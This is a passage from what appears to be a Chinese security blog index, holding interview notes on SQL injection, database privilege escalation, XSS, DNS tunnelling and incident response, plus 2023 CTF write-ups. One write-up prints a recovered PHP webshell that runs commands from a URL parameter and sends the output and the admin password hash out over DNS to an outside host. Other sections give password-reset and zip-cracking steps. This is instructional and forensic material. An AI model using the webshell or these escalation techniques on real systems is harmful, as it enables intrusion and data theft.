:替换为base64编码。\n3、multiplespaces.py:围绕SQL关键字添加多个空格。\n4、space2plus.py:用+号替换为空格。\n\n\n**绕过**\n1.大小写绕过注入\n2.双写绕过注入\n3.编码绕过注入\n4.内联注释绕过注入\n\n\n**修复**\n使用预编译，PDO，正则表达式过滤，加装WAF等\n\nPDO原理：当调用prepare()时，查询语句已经发送给了数据库服务器，此时只有占位符?发送过去，没有用户提交的数据；当调用到execute()时，用户提交过来的值才会传送给数据库，他们是分开传送的，\n\n不能使用pdo的情况：\n1：不能让占位符 ? 代替一组值\n2：不能让占位符代替数据表名或列名(ORDER BY)\n3：你不能让占位符 ? 代替任何其他SQL语法\n\n\n\n## mysql提权方式\n\n**MOF提权**\n\n利用了C:\\Windows\\System32\\wbem\\MOF目录下的nullevt.mof文件\n利用该文件每分钟会去执行一次的特性，向该文件中写入cmd命令，就会被执行\n\n利用条件\n只使用于windows系统，一般低版本系统才可以用，比如xp、server2003\n对C:\\Windows\\System32\\wbem\\MOF目录有读写权限\n可以找到一个可写目录，写入mof文件\n\n**udf提权(用户自定义函数提权)**\n\nUDF提权是利用MYSQL的自定义函数功能，将MYSQL账号转化为系统system权限\n\n利用条件\n如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的MySQL\\Lib\\Plugin\\文件夹下，该目录默认是不存在的，需要使用webshell找到mysql的安装目录，并在安装目录下创建MySQL\\Lib\\Plugin\\文件夹，然后将udf.dll导入到该目录。\n如果mysql版本小于5.1，udf.dll文件在windows server 2003下放置于c:/windows/system32/目录，在windows server 2000下放置在c:/winnt/system32/目录。\n\n\n**开机启动脚本（启动项提权）**\n\n这种提权也常见于 Windows 环境下，当 Windows 的启动项可以被 MySQL 写入的时候可以使用 MySQL 将自定义脚本导入到启动项中，这个脚本会在用户登录、开机、关机的时候自动运行。\n\n\n**CVE-2016-6663**\n\n竞争条件提权漏洞，一个拥有 CREATE/INSERT/SELECT 低权限的账户提权成功后可以系统用户身份执行任意代码，提权的用户为 mysql 用户，概括一下就是将低权限的 www-data 权限提升为 mysql 权限\n\n利用条件\nGetshell 拿到 www-data 权限\n拿到 CREATE/INSERT/SELECT 低权限的 MySQL 账户\n关键提取步骤需要在交互环境下，所以需要反弹 shell\nMySQL 版本需要 <= 5.5.51 或 5.6.x <= 5.6.32 或 5.7.x <= 5.7.14 或 8.x < 8.0.1\nMariaDB 版本需要 <= 5.5.51 或 10.0.x <= 10.0.27 或 10.1.x <= 10.1.17\n\n\n## mssql提权\n\n**xp_cmdshell**\n\n在2005中xp_cmdshell的权限是system，2008中是network\n添加管理员用户或者远程下载文件cs上线\n\n\n**sp_oacreate**\n\n当 xp_cmdshell 被删除可以使用这个来提权试试，先恢复 sp_oacreate\nsp_oacreate是一个非常危险的存储过程可以删除、复制、移动文件 还能配合sp_oamethod来写文件执行cmd\n\n1：调用cmd 来执行命令\n2：写入启动项\n3：粘贴键替换\n\n\n\n\n## 什么是跨域，JSONP与CORS\n\n**同源策略**\n同源策略：域名、协议、端口均相同\n浏览器执行 JavaScript 脚本时，会检查这个脚本属于那个页面，如果不是同源页面，就不会被执行\n\n**什么是跨域？**\n跨域：指的是浏览器不能执行其它网站的脚本，它是由浏览器的同源策略造成的，是浏览器的安全限制！\n\n**JSONP跨域**\n利用 js script 标签中 src 属性可以跨域的特性，使用 callback 参数的函数名来接收数据\n只支持 GET 请求，不支持 POST 等其它请求，也不支持复杂请求，只支持简单请求\n\n**CORS跨域**\n支持所有的请求，包含 GET、POST、OPTOIN、PUT、DELETE 等既支持复杂请求，也支持简单请求\nJSONP 与 CORS 的使用目的相同，并且都需要服务端和客户端同时支持，但 CORS 的功能更加强大\n\n**JSONP和CORS的优缺点**\n1. JSONP 的主要优势在于对浏览器的支持较好；虽然目前主流浏览器都支持 CORS，但 IE9 及以下不支持 CORS\n2. JSONP 只能用于获取资源（即只读，类似于 GET 请求）；CORS 支持所有类型的 HTTP 请求，功能完善\n3. JSONP 只会发一次请求；而对于复杂请求，CORS 会发两次请求\n\n**应用场景**\n如果需要兼容IE低版本浏览器，无疑，JSONP\n如果需要对服务端资源进行操作，无疑，CORS\n其他情况的话，根据自己的对需求的分析来决定和使用\n\n\n## xss\n\nDom（Self-XSS） 存储型 反射型\n\n\n存储型：出现在留言、评论、博客日志等交互处，直接影响Web服务器自身安全\n\n\n**利用**\n钓鱼，钓cookie\n记录键盘输入值\nxss加csrf组合拳\nxss+ssrf+redis\n\n\n## dns隧道攻击的原理\n\n核心思想：端口不和服务绑定，可以传输任何数据。\n\nDNS隧道的原理就是：在后门程序进行DNS查询时，如果查询的域名不在DNS服务器本机的缓存中，就会访问互联网进行查询，然后返回结果，如果互联网上有一台攻击者设置的服务器，那么服务器就可以依靠域名解析的响应进行数据包的交换，从DNS协议的角度来看，这样的操作只是反复查询某个或者某些特定的域名并且得到解析结果，但其本质是，DNS预期的返回结果应该是一个IP地址，而事实上不是——返回的可以是任意字符串，包括加密的C&C指令，从而将其他协议封装在DNS协议中进行传输。\n\n直连模式：客户端直接向指定IP地址的DNS服务器发起DNS解析请求\n中继模式：DNS经过互联网的迭代解析，指向指定的DNS服务器。\n\n流量特征：\n1：超长子域名\n2：Dns默认响应值：0.0.0.0\n3：默认使用TXT格式传递base64格式的加密信息\n\n\n## 内存马\n\n**PHP 内存马**\n\nphp 内存马也就是 php 不死马，不死马启动后删除本身，在内存中执行死循环，使管理员无法删除木马文件\n\n处理方法：重启服务，杀掉不死马的进程，检测执行文件是否在文件系统真实存在\n\n\n**Python 内存马**\n\nPython 内存马利用 flask 框架中 SSTI 注入来实现，flask 框架中在 web 应用模板渲染的过程中用到 render_template_string() 进行渲染，但未对用户传输的代码进行过滤导致用户可以通过注入恶意代码来实现 python 内存马的注入。\n\n检测方法：查看所有内建模块中是否包含 eval、exec 等可以执行代码的函数如：class warnings.catch_warnings、class site.Quitter等。检查add_url_rule函数中的路由\n\n\n\n**java内存马（filter型）**\n\n```java\nservlet-api类\n    filter型\n    servlet型\nspring类\n    拦截器\n    controller型\nJava Instrumentation类\n    agent型\n```\nservlet-api类：\n通过命令执行等方式动态注册一个新的listener、filter或者servlet，从而实现命令执行等功能。\n\nJava Instrumentation类：\n通过java的instrumentation动态修改已有代码，进而实现命令执行等功能。\n\nfilter型查杀：\n利用Java Agent技术遍历所有已经加载到内存中的class。先判断是否是内存马，是则进入内存查杀。\n\n**特征：**\n1：shiro反序列化中往往需要把filter匹配优先级调至最高\n2：某些情况下filter名字很特别\n3：对比web.xml中没有filter配置(内存马的Filter是动态注册的，所以在web.xml中肯定没有配置)\n4：对应的classloader路径下没有class文件（Filter也是class，也是必定有特定的classloader加载）\n5：Filter的doFilter方法中有恶意代码（可以把内存中所有的Filter的class dump出来，使用fernflower等反编译工具分析看看，是否存在恶意代码，比如调用了如下可疑的方法：java.lang.Runtime.getRuntime/defineClass/invoke）\n\n\n**查杀**\n1：清除内存马中的Filter的恶意代码\n2：模拟中间件注销Filter\n\n\n## 进程注入\n\n进程注入就是给一个正在运行的程序开辟一块内存，把shellcode放入内存，然后用一个线程去执行shellcode\n\n广泛应用于恶意软件和无文件攻击中的逃避技术，这意味着攻击者可以将自定义代码运行在另一个进程的地址空间内，然后去进行敏感操作，以达到隐藏自身，绕过安全产品检测的目的。\n\n\n## 内网\n\n**扫描方式**\n\nTCP CONNECT SCAN：与目标端口建立3次握手\nTCP SYN SCAN：TCP半连接扫描，只发送三次握手的第一次SYN报文段，速度快且不容易被防火墙记录进日志\n\nUDP SCAN：有回应则认为是open。由于UDP的不可靠性，无法判断报文段是丢了还是没有回应，所以一般扫描器会发送多次，然后根据结果再判断。所以udp扫描很慢\n\nICMP SCAN：ping\n\nSCTP：流控制传输协议，作为一个传输层协议，SCTP可以理解为和TCP及UDP相类似的\n\nIP Scan：IP协议扫描允许您确定目标计算机支持哪些IP协议（TCP，ICMP，IGMP等）。这在技术上不是端口扫描，因为它循环通过IP协议号而不是TCP或UDP端口号\n\n\n\n# 研判\n\n研判工作要充分利用已有安全设备（需要提前了解客户的网络拓扑以及部署设备情况），分析其近期的设备告警，将全部流量日志（日志条件：源地址，目的地址，端口，事件名称，时间，规则 ID，发生 次数等）根据研判标准进行筛选（像挖矿、蠕虫、病毒、拒绝服务这类不太可能为攻击方发起的攻击的事件，直接过滤掉，减少告警数量），一般情况下，真实攻击不可能只持续一次，它一定是长时间、周期性、多 IP 的进行攻击\n\n对于告警结合威胁情报库如：微步、奇安信威胁情报中心、绿盟威胁情报云等对于流量日志的原 IP 地址进行分析，判断其是否为恶意攻击，推荐使用微步的插件，如果确认为攻击行为或者不能确认是否为攻击行为，进行下一步操作，在之前准备好的表格中查找 IP 是否为客户内网部署的设备，如果不是，继续进行下一步，在事件上报平台查看是否有其他人提交过，如果没有，则上报\n\n然后根据流量日志，对请求数据包和返回数据包分析判断其是否为误报，需要留意 X-Forwarded-For（简称XFF）和 x-real-ip 可以了解些 webshell 工具的流量特征，尤其是免杀 webshell，有可能不会被设备识别\n\n最后上报事件时，尽可能提供完整的截图，包括源 ip、目的ip，请求包请求体，响应包响应体等重要信息，以方便后续人员研判溯源\n\n\n# 应急响应\n\n>1. 有重要业务数据交互，先排查a，b，c之间的业务数据联系，只允许到指定主机流量，排查shell外联地址，是内网还要继续找到其他失陷的主机\n>2. 没有重要业务则隔离\n\n1. 收集信息：收集客户信息和中毒主机信息，包括样本\n2. 判断类型：判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DoS 等等\n3. 抑制范围：隔离使受害⾯不继续扩⼤\n4. 深入分析：日志分析、进程分析、启动项分析、样本分析方便后期溯源\n5. 清理处置：杀掉进程，删除文件，打补丁，删除异常系统服务，清除后门账号防止事件扩大，处理完毕后恢复生产\n6. 产出报告：整理并输出完整的安全事件报告\n\n\n大致过程包括：主机隔离、系统备份、病毒及后门等的检测和排查、清除病毒及后门、修复漏洞、安全加固、系统恢复、调查追踪\n\n\n## linux入侵排查\n1. 账号排查：记住几个关键的文件，如/etc/passwd、/etc/shadow，看看有没有异常账号、特权账号，例如uid=0|可远程登入|sudo权限，对发现的可疑账号进行删除\n2. 历史命令：/home目录下的各个账号，.bash_history\n3. 进程、端口等：netstat -antlp，ps aux，top等查看，发现cpu占比很高或其他异常的进程，通过ls -l /proc/PID/exe ，可以找到异常程序所在位置。通过kill可以杀死进程\n4. 开机启动项、定时任务等：如果杀死进程后又重新启动，在以下位置可能找到问题所在。开机启动项/etc/ini.d；自启项/etc/rc.local；定时任务crontab\n5. 日志：/var/log/*，里面有很多日志，比如/wtmp记每个用户的登录次数和登录时间，/btmp记录错误登录的日志\n还有些比如命令行last查看登入信息，find查看文件文件改动时间、查看777权限文件等\n\n\n## windows入侵排查\n1. 查弱口令/可疑账号\n    查看服务器是否有系统弱口令、web弱口令等，远程管理端口是否对公网开放。实际情况与运维沟通\n    查看服务器是否会新增可疑账号、新增账号\n\n2. 排查克隆账号\n注册表，d盾等\n\n3. 排查异常端口、进程\n   首先我们要排查那些进程是跟外网进行通信的，根据netstat定位出的pid，再通过tasklist命令定位到他的相关进程是什么，使用命令：netstat -aon\n\n4. 可疑进程\n    上传vt，火绒剑，看签名，分析dll\n\n5. 检查启动项、计划任务、服务\n    at，taskschd.msc\n\n6. 系统补丁漏洞排查\n    查看systeminfo漏洞打补丁，在线漏洞补丁查询：https://i.hacking8.com/tiquan/\n\n7. 日志分析\n    首先他的前提条件是：它得开启审核策略。若往后系统出现故障、安全事故都可以查看系统的日志文件排除故障，追查入侵者的信息等。导出Windows日志-安全，利用LogParser进行分析\n4624 = 登录成功\n4625 = 登录失败\n4634 = 注销成功\n4672 = 使用超级用户（管理员）进行登录\n4776：NTLM身份验证登录系统\n4648 = 试图使用明确的凭证登录（这个会记录IP等信息）\n\n8. 查杀Webshell\n\n\n\n## 查到webshell应该如何处置？(主机失陷处理)\n\n网站被植入 webshell，意味着网站存在可利用的高危漏洞，攻击者通过利用漏洞入侵网站，写入 webshell 接管网站的控制权\n\n1. 及时隔离主机\n2. 定位事件范围，查看文件 webshell 文件的创建时间，对 webshell 取证样本\n3. 通过创建时间结合日志分析可疑行为，以及启动用户的其他进程确定漏洞\n4. 清除 webshell 及残留文件，修复漏洞，参考上题\n\n\n## 0day处理\n\n1. 首先是评估 0day 对自身系统的影响（这部分评估需要根据漏洞利用的利用点、是否需要交互、是否会影响系统的 CIA，是否有在野利用 poc，影响资产是否暴露在公网等很多因素决定，详情可以参考 CVSS ）\n2. 如果确定有影响的话且有 poc，第一件事是先分析 poc 执行后会在什么地方留下痕迹，我们有什么样的设备去采集这些痕迹所留下的数据，比如说 ntlm relay 这种，可以考虑从 Windows 事件日志当中 event_id 等于 4769 的事件入手编写对应的规则，这样的话可以利用 SIEM 或者实时日志分析平台跑起来，可以建立起初步的感知防线，后期触发告警，人肉运营也可以快速止损\n3. 日常建立完整的纵深防御体系，不要依赖于某一道防线\n\n\n# 溯源\n\n1：获取到攻击ip\n2：ip反查，（看是不是代理ip），微步在线\n3：对这个ip进行资产探测，端口扫描\n4：进行渗透\n5：如果成功渗透后就可以进行 信息收集，建立画像，找一些社交账号\n\n","tags":["hw"],"categories":["hw"]},{"title":"第三届\"红明谷\"杯网络安全大赛wp","url":"/posts/86dd8190/","content":"\n# misc\n\n\n\n## 阿尼亚\n\n文件尾有一串字符串`6333383363333963633338326333616263333865633261616332613363326261633262636333623263326235633261356332623563333834633262316333613063333832633361623061`，十六进制转字符串得到`c383c39cc382c3abc38ec2aac2a3c2bac2bcc3b2c2b5c2a5c2b5c384c2b1c3a0c382c3ab0a`\n\nC383明显是中文编码，转十六进制后爆破得到密码`简单的编码`\n\n![](/img/wp/2023/2023hmg-1.png)\n\n根据图片名字`netpixeljihad`，使用`PixelJihad`解密，密码是`简单的编码`\n\n![](/img/wp/2023/2023hmg-2.png)\n\n得到压缩包的密码`P@Ss_W0RD:)`\n\n解压得到`+-+-++--+- ++---+-++- -+--++-++- +--++-++-- --+++++--- ++-++---+- +++-+-+--- +-+-+---++ ---+++-++- -+--++-++- -+--+++-+- -+--++-++- -+--++-++- ++-+-+-+-- -+--+++-+- ++-++---+- -++++---+- -+--++-++- ++-+-+-+-- +-+++---+- +++-++---- ---+++-++- +-+-+---++ ++-+-+-+-- +-+-+--++- ++--+--++- -++++---+- +---+++-+- ++-+-+-+-- -++++---+- -+--+++-+- +--+-+-++- +++-+-+--- +-+++---+- -+--+-+++- -+--++-++- ---+++-++- ++++----+- -++++---+- -+--+++-+- -+--++-++- ----+++++-`\n\n[在线解密](https://www.dcode.fr/code-decabit)一把梭\n\n![](/img/wp/2023/2023hmg-3.png)\n\n\n\n## hacker\n\n流量分析，发现有个`shell.php`上传了一个`xxx1.php`，然后执行了`ls`和`cat secret.txt`\n\n\n格式化后如下\n\n```php\n<?php $servername=\"127.0.0.1\";\n$username=\"root\";\n$password=\"123456\";\n$dbname=\"zentao\";\n$conn=new PDO(\"mysql:host=$servername;dbname=$dbname\",$username,$password);\n$conn->setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION);\n$stmt=$conn->prepare(\"SELECT password FROM zt_user WHERE account=\\'admin\\'\");\n$stmt->execute();\n$result=$stmt->fetch(PDO::FETCH_ASSOC);\n$conn=null;\n$param=$_GET[\"cmd\"];\n$password=$result[\"password\"];\n$output=shell_exec($param);\n$hex_output=bin2hex($output);\n$hex_password=bin2hex($password);\n$len_output=strlen($hex_output);\n$len_password=strlen($hex_password);\n$max_subdomain_length=62;\n$subdomain_base=\"yafgcy.ceye.io\";\n$hex_xor=\"\";\nfor ($i=0;$i<$len_output;$i++) {\n\t$char_output=$hex_output[$i];\n\t$char_password=$hex_password[$i%$len_password];\n\t$char_xor=dechex(hexdec($char_output)^hexdec($char_password));\n\tif(strlen($hex_xor.$char_xor)>$max_subdomain_length) {\n\t\tif(strlen($hex_xor)%2!=0) {\n\t\t\t$subdomain=\"0\".\"$hex_xor.$subdomain_base\";\n\t\t} else {\n\t\t\t$subdomain=\"$hex_xor.$subdomain_base\";\n\t\t}\n\t\tgethostbyname($subdomain);\n\t\t$hex_xor=\"\";\n\t} else {\n\t\t$hex_xor.=$char_xor;\n\t}\n}\nif(strlen($hex_xor)%2!=0) {\n\t$subdomain=\"0\".\"$hex_xor.$subdomain_base\";\n} else {\n\t$subdomain=\"$hex_xor.$subdomain_base\";\n}\ngethostbyname($subdomain);\n?>\n```\n\n发现是`dns`流量\n\n提取出`secret.txt`，根据代码可知要与`admin`的密码进行异或\n\n```text\n79227024716c7522787370254c777230667673222570247b76677322632671\nd7b357226771575227a7372237677702573611f372570317b7672772076206\n1479207024777b60247e6674231a626727666171372570317f766773207620\n067879226731756c60206d75703670754e\n\npassword:8a3e684c923b763d252cf1e8734a7a29\n```\n\n异或后发现是`DNA`编码，每62位会少内容，爆破就行\n\n```python\nmapping = {\n\n'AAA':'a',\n'AAC':'b',\n'AAG':'c',\n'AAT':'d',\n'ACA':'e',\n'ACC':'f',\n'ACG':'g',\n'ACT':'h',\n'AGA':'i',\n'AGC':'j',\n'AGG':'k',\n'AGT':'l',\n'ATA':'m',\n'ATC':'n',\n'ATG':'o',\n'ATT':'p',\n'CAA':'q',\n'CAC':'r',\n'CAG':'s',\n'CAT':'t',\n'CCA':'u',\n'CCC':'v',\n'CCG':'w',\n'CCT':'x',\n'CGA':'y',\n'CGC':'z',\n'CGG':'A',\n'CGT':'B',\n'CTA':'C',\n'CTC':'D',\n'CTG':'E',\n'CTT':'F',\n'GAA':'G',\n'GAC':'H',\n'GAG':'I',\n'GAT':'J',\n'GCA':'K',\n'GCC':'L',\n'GCG':'M',\n'GCT':'N',\n'GGA':'O',\n'GGC':'P',\n'GGG':'Q',\n'GGT':'R',\n'GTA':'S',\n'GTC':'T',\n'GTG':'U',\n'GTT':'V',\n'TAA':'W',\n'TAC':'X',\n'TAG':'Y',\n'TAT':'Z',\n'TCA':'1',\n'TCC':'2',\n'TCG':'3',\n'TCT':'4',\n'TGA':'5',\n'TGC':'6',\n'TGG':'7',\n'TGT':'8',\n'TTA':'9',\n'TTC':'0',\n'TTG':' ',\n'TTT':'.'\n\n\n}\n\n\nencode_string = 'OME'\n\ndecode_string = 'GGAGCGCTG' \n\ninverted_mapping = dict(zip(mapping.values(), mapping.keys()))\n\ndef decode_dna( decode_string ):\n\n    pieces = []\n    for i in range( 0, len(decode_string), 3 ):\n        piece =  decode_string[i:i+3]\n        # pieces.append()\n        pieces.append( mapping[piece] )\n\n    return \"\".join(pieces)\n\ndef encode_dna(encode_string):\n    pieces = []\n    for i in encode_string:\n        piece =  inverted_mapping[i]\n        pieces.append(piece)\n    return \"\".join(pieces)\n\nprint 'Decoded String is:- '+ decode_dna(decode_string)\nprint 'Encoded DNA String is:- '+ encode_dna(encode_string)\n```\n\n\n\n\n## X光的秘密\n\n\n给了个`task.dcm`文件，百度到能打开的软件[MicroDicom](https://www.microdicom.com/downloads.html)\n\n\n使用软件导出，一共有二十张\n\n![](/img/wp/2023/2023hmg-4.png)\n\n\n使用stegsolve发现最后三张图存在LSB\n\n\n脚本提取出最低位数据，因为是灰度图，所以用其中一个通道就行了\n```python\nfrom PIL import Image\n\nimg=Image.open('img-00001-00018.png')\nw,h=img.size\n\nrgb=['','','']\n\nfor j in range(h):\n    for i in range(w):\n        data=img.getpixel((i,j))\n        rgb[0]+=str(data[0]%2)\n        rgb[1]+=str(data[1]%2)\n        rgb[2]+=str(data[2]%2)\nprint('r1: '+rgb[0])\n#print('glow: '+rgb[1])\n#print('blow: '+rgb[2])\n\n\nfile = open(\"r1.txt\", \"w+\")\ncontent = str(rgb[0])\nfile.write(content)\nfile.close()\n```\n\nimg-00001-00018.png\n\n```text\n100100010010110001101000000000\n```\n\nimg-00001-00019.png\n\n```text\n0110000110101001010000000000000\n```\n\nimg-00001-00020.png\n\n```text\n0001011001000010000010000000001\n```\n\n将三张图片按顺序拼接发现刚好是`10001001`，`0x89`为`PNG`的头\n\n使用脚本合并\n```python\nf1 = open(\"r.txt\")\nf2 = open(\"r2.txt\")\nf3 = open(\"r3.txt\")\nd1=f1.read()\nd2=f2.read()\nd3=f3.read()\n\nnew=''\n\nfor i,v in enumerate(d1):\n    new+=v+d2[i]+d3[i]\n\nfile = open(\"1.txt\", \"w+\")\nfile.write(new)\nfile.close()\n```\n\n![](/img/wp/2023/2023hmg-5.png)\n\n\n# web\n\n## 点击签到\n\n签到，点点点\n\n![](/img/wp/2023/2023hmg-6.png)\n\n\n## Dreamer && Dreamer_revenge\n\n参考[Dreamer CMS 代码审计](https://forum.butian.net/share/2183#/)\n\n默认后台管理员账号密码为`wangjn/123456`\n\n在源码中复制一份`\\src\\main\\resources\\db\\dreamer-cms\\templates\\default_v2`，修改`theme.json`文件中的`themePath`为`../../../../../../../../../../../`，然后打包成压缩包，在后台`风格管理`处上传\n\n![](/img/wp/2023/2023hmg-7.png)\n\n启用后在`模板管理`处就可以看到跟目录下的文件了\n\n![](/img/wp/2023/2023hmg-8.png)\n\n\n\n`Dreamer_revenge`的步骤与`Dreamer`一致，不过flag在`/proc/1/environ`\n\n![](/img/wp/2023/2023hmg-9.png)\n\n\n## Eyou\n\nEyouCMS v1.6.1 反序列化漏洞\n\n参考[EyouCMS v1.6.1 0day挖掘](https://n1k0la-t.github.io/2023/01/28/EyouCMS%20v1.6.1%200day%E6%8C%96%E6%8E%98/)","tags":["wp","2023竞赛","红明谷"],"categories":["wp"]},{"title":"2023NKCTF-wp","url":"/posts/50c22730/","content":"\nrank：15\n\n![](/img/wp/2023/2023nkctf-1.png)\n\n# Misc\n\n## hard-misc\n\n`base32`，公众号发`NKCTF2023我来了！`\n\n\n## blue\n\n先导入进vmware，开机发现是windows2008系统，用户带密码\n\n挂载一个2008的iso镜像，设置启动项为cd优先，重启，选择修复计算机，进入命令提示符\n\n![](/img/wp/2023/2023nkctf-2.png)\n\n复制一份cmd到放大镜\n\n![](/img/wp/2023/2023nkctf-3.png)\n\n左下角启动放大镜功能后就启动了cmd，修改administrator密码\n\n![](/img/wp/2023/2023nkctf-4.png)\n\n进入系统\n\n![](/img/wp/2023/2023nkctf-5.png)\n\n\n## easymusic\n\n根据提示百度搜到了类似的一题[2020天翼杯-音频隐写](https://cloud.tencent.com/developer/article/1676153)\n\n使用`OpenPuff`工具\n\n文件尾得到`psdC:01374890`\n\n频谱找到`PSdB:74208645`\n\n波形转换得到`psdA:83979367`\n\n导出flag.txt\n\n![](/img/wp/2023/2023nkctf-6.png)\n\n\n## easy_rgb\n\nmontage+gaps画图\n`montage *.png -tile 12X15 -geometry +0+0 flag.png`\n`gaps --image=flag.png --generation=30 --population=300 --size=125`\n\n得到key：`NKCTF2023`\n\n![](/img/wp/2023/2023nkctf-7.png)\n\n\n`r`,`g`,`b`转成`zip`\n\n```python\nr=open('r.txt').read()\ng=open('g.txt').read()\nb=open('b.txt').read()\ne=\"\"\nm=max([len(r),len(b),len(g)])\nfor i in range(m):\n    try:\n        e+=r[i]\n    except:\n        pass\n    try:\n        e+=g[i]\n    except:\n        pass\n    try:\n        e+=b[i]\n    except:\n        pass\nf=open('1.zip','wb')\nf.write(bytes.fromhex(e))\nprint(e)\n```\n\n得到hint：`AES-128`和data：`IBTyf9pgyR9pCERLR5NuOpiONSG1VZptmvUIgoQ/RTEpTZPVTW2a779plBFIvcN+`\n\n\n在线aes-128解密，key为`NKCTF2023`\n\n## first spam of rabbit year\n\n[垃圾邮件](https://www.spammimic.com/decode.cgi)解密得到`佛曰：栗楞穆婆悉遮俱吉室嚧无佛吉埵沙他蒙蒙唎皤啰烁伽驮数迦帝楞萨那摩度驮伽度耶萨那曳喝写怛钵遮耶烁埵室摩迦尼菩呼阇栗墀豆哆烁利吉舍阿萨俱夜嚧蒙喝喝诃罚悉阇喝无数那迦陀室沙穆皤南陀娑利烁输夜输参陀数醯诃提耶钵遮夜栗谨伽俱菩度咩烁室醯迦输诃度唎阇钵无羯栗提摩谨咩悉哆阇室悉钵楞那他伽啰伊耶谨那尼那呼伊罚卢输南喝豆娑伽唎醯嚧那嚧羯摩吉参喝那阿地墀数陀楞啰孕罚度醯菩萨埵埵栗他穆菩参舍迦羯沙啰吉尼楞怛尼孕苏地遮苏提曳谨阇那啰阇南曳输曳伊苏伊度啰咩提苏他他娑驮俱婆钵室利烁俱伽写利羯悉阇遮皤佛南悉阿帝萨喝悉阇参参楞罚皤苏喝墀诃他吉伽提利尼埵啰输嚧醯婆伽墀菩唎娑谨他怛写沙伽啰烁摩栗埵伊啰俱楞帝写地卢利怛吉帝陀阿唵伊伽谨曳阇羯娑羯嚧埵唎烁楞喝曳输他阿室钵谨啰楞他呼娑喝菩哆蒙穆诃婆烁他夜孕穆诃钵佛参室悉舍萨穆室遮阿喝啰伽耶喝漫`\n\n社会主义核心价值观解密得到`rabbit 又 move`\n\n佛曰加个又，key是`rabbit`，解密得到密文\n```text\n&​​​​‍‎‏auD5​​​​‏‍​v'<)​​​​‏‍‌`h​​​​‎​‏{dF6C_*'Jrcqzrh&ZaF>`g^​​​​‏‍‌Hr'}vuHZJB​​​​‎​‏%~}_H5?gu​​​​‌‏‏;q​​​​‍‏‌)\"<rA?{sH2{IfafKfu=6w_tip:47&13\n```\n\n0宽得到key：`EnoOoO1G`\n\n根据结尾的提示，密文rot47，key rot13\n\n得到`U2FsdGVkX19L5uer0YVyC4BKC9U+2um18/wCVNGFw+yqTON0wdn8FjBXQkCpnLDwaLx727z7FleH`和`RabBbB1T`\n\n在线rabbit得到`NKCTF{H4Ppy_tH3_Y34r_0f_R4BbBbbbB1tTtTtT}`\n\n## misc?iot!\n\n[参考文章](https://www.anquanke.com/post/id/229321)\n\n选择`arm little-endian`\n\n如果要写地址默认为`0x8000000`\n\n![](/img/wp/2023/2023nkctf-8.png)\n\nsub_800014C是rc4生成密钥的过程\n\n![](/img/wp/2023/2023nkctf-9.png)\n\n复制密钥的过程，得到key：`NKCTF2023`\n\n![](/img/wp/2023/2023nkctf-10.png)\n\n从V5开始的18个字节是密文，小端序提取出来：`245F02E287A0A76C072A75DA3F8A57D71A1F`\n\n![](/img/wp/2023/2023nkctf-11.png)\n\n在线rc4解密得到`NKCTF{H3l10_stm32}`\n\n\n## easy_word\n\n根据注释中的提示爆破密码\n```python\nimport hashlib\nbase='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'\nfor j in range(62**4):\n    d=[]\n    for i in range(4):\n        d.append(base[j%62])\n        j=j//62\n    d=tuple(d)\n    e=\"h%s%svO%s%s0\"%d\n    hash=hashlib.sha256(e.encode()).hexdigest()\n    if 'b75d1224' in hash[:8]:\n        print(e)\n        break\nprint(e)\n\n```\n\n改成zip解压，`media`目录下有一张`image1.png`，图片上有key：`Welcome_to_NKCTF`\n\n`cloacked-pixel`得到flag\n\n![](/img/wp/2023/2023nkctf-12.png)\n\n\n## 三体\n\nstegsolve观察发现`green`和`blue`有数据，脚本提取\n\n```python\nfrom PIL import Image\na=Image.open('3.bmp')\nd=a.getdata()\nw,h=a.size\ne=[]\nfor y in range(h):\n    for x in range(w):\n        i=a.getpixel((x,y))\n        e.append(chr((i[1]<<8)+i[2]))\nf=open('1.txt','w')\nf.write(''.join(e))\n```\n\n得到`NKCTF{3d77dc1a37b2d1ebf489c973f554ea10}`\n\n\n## easy_bmp\n\n在010中分别修改高和宽，得到key：`BMP_Height_width_easy`\n\n![](/img/wp/2023/2023nkctf-13.png)\n\n解压后得到`flag.bmp`，继续爆破宽高，`360*360`，扫二维码得到flag\n\n`NKCTF{eab1291e-9e37-4ff1-b76d-f1af63eaad43}`\n\n\n## baby_music\n\n010打开，发现很多重复的`10 27`和`11 27`\n\n将`10 27`转为`0`，`11 27`转为`1`\n\n二进制转文件\n\n```python\nf=open(\"flag.wav\",'rb')\nd=f.read()[0x2c:]\ne=[]\nq=\"\"\nfor i in range(0,len(d),2):\n    if d[i]==0x10:\n        q+='0'\n    else:\n        q+='1'\n    if len(q)==8:\n        e.append(int(q,2))\n        q=\"\"\nf=open('flag','wb')\nf.write(bytes(e))\nf.close()\n```\n\n发现是`zip`\n\n注释中`0`转为`.`，`1`转为`-`，`换行`转为`/`\n\n`.--/./.-../-.-./---/--/./-/---/-./-.-/-.-./-/..-./--..--/-/...././.--./.-/.../.../.--/---/.-./-../../.../.----/-..../-.../-.--/-/./.../.-./.-/-./-../---/--/.-../-.--/--././-././.-./.-/-/./-../--..--/../.../-/...././.-././.-/-..././-/-/./.-./.--/.-/-.--/-/---/..-/-./.-../---/-.-./-.-/-/...././--../../.--./..--..`\n\n解摩斯得到\n`WELCOME TO NKCTF,THEPASSWORDIS16BYTESRANDOMLYGENERATED,ISTHEREABETTERWAYTOUNLOCKTHEZIP?`\n\n根据提示，猜测是深入明文攻击\n\n先构造已知的明文，即`flag.png`的文件头加`IHDR`，写入到`plain.txt`\n\nplain.txt：`89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52`\n\n使用`bkcrack`爆破key\n\n`bkcrack.exe -C flag.zip -c flag.png -p plain.txt`\n\n修改`flag.zip`的密码\n\n`bkcrack.exe -C flag.zip -k 846ad344 02327731 173ff347 -U 1.zip easy`\n\n![](/img/wp/2023/2023nkctf-14.png)\n\n解压得到flag\n\n`NKCTF{You_are_very_smart!!}`\n\n\n## THMaster\n\n先开启`THmaster.exe`监听，再开启`th12.exe`\n\nce修改分数到2亿多\n\n![](/img/wp/2023/2023nkctf-15.png)\n\n在`replay`文件夹下的`th12_01.rpy`中找到flag\n\n\n\n## 